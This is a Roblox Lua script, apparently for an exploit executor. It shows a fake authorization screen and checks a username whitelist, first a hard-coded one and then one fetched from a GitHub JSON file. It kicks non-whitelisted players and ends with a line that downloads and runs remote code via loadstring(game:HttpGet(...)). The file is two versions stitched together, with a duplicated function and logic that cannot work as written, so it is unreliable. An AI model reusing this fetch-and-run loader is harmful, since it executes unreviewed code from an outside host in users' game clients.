-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AuthorizationGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create main frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 0
MainFrame.Parent = ScreenGui

-- Create loading text
local LoadingText = Instance.new("TextLabel")
LoadingText.Name = "LoadingText"
LoadingText.Size = UDim2.new(0, 400, 0, 50)
LoadingText.Position = UDim2.new(0.5, -200, 0.4, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 24
LoadingText.Font = Enum.Font.GothamBold
LoadingText.Text = "Checking Authorization..."
LoadingText.Parent = MainFrame

-- Create progress bar background
local ProgressBG = Instance.new("Frame")
ProgressBG.Name = "ProgressBackground"
ProgressBG.Size = UDim2.new(0, 300, 0, 10)
ProgressBG.Position = UDim2.new(0.5, -150, 0.5, 0)
ProgressBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBG.BorderSizePixel = 0
ProgressBG.Parent = MainFrame

-- Create progress bar
local ProgressBar = Instance.new("Frame")
ProgressBar.Name = "ProgressBar"
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 128)
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = ProgressBG

-- Create status text
local StatusText = Instance.new("TextLabel")
StatusText.Name = "StatusText"
StatusText.Size = UDim2.new(0, 400, 0, 50)
StatusText.Position = UDim2.new(0.5, -200, 0.6, 0)
StatusText.BackgroundTransparency = 1
StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusText.TextSize = 18
StatusText.Font = Enum.Font.Gotham
StatusText.Text = ""
StatusText.Parent = MainFrame

-- Function to check if player is whitelisted
local function isWhitelisted(player)
    local whitelistedUsers = {
        ["Username"] = true  -- Add more usernames here as needed
    }
    return whitelistedUsers[player.Name]
end

-- Main authorization script
local function startAuthorization()
    local player = game.Players.LocalPlayer
    local tweenService = game:GetService("TweenService")
    
    -- Tween progress bar
    local progressTween = tweenService:Create(ProgressBar, 
        TweenInfo.new(2, Enum.EasingStyle.Linear), 
        {Size = UDim2.new(1, 0, 1, 0)}
    )
    progressTween:Play()
    
    -- Wait for tween to complete
    wait(2)
    
    -- Check authorization
    if isWhitelisted(player) then
        LoadingText.Text = "Access Granted!"
        StatusText.Text = "Welcome, " .. player.Name
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 128)
    else
        LoadingText.Text = "Access Denied"
        StatusText.Text = "User not authorized"
        StatusText.TextColor3 = Color3.fromRGB(255, 0, 0)
        ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
    
    -- Fade out after displaying result
    wait(2)
    local fadeTween = tweenService:Create(MainFrame, 
        TweenInfo.new(1, Enum.EasingStyle.Linear), 
        {BackgroundTransparency = 1}
    )
    fadeTween:Play()
    
    -- Clean up
    wait(1)
    ScreenGui:Destroy()
end

-- Start the authorization process
startAuthorization()

-- ... existing GUI creation code remains the same ...

-- Updated whitelist checking function
local function isWhitelisted(player)
    -- Fetch whitelist data from GitHub
    local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/AK-ADMIN/refs/heads/main/AK%20ADMIN.json"))
    getgenv().whitelistedPlayers = data.whitelisted
    getgenv().premiumUsers = data.premium
    
    return table.find(whitelistedPlayers, player.Name) ~= nil
end

-- Add PlayerAdded event handler after authorization
game.Players.PlayerAdded:Connect(function(p)
    if not table.find(whitelistedPlayers, p.Name) then
        setclipboard("https://discord.gg/WRkqKcnm")
        p:Kick("Not whitelisted.")
    end
end)

-- Load the bot template
loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Bot%20template"))()
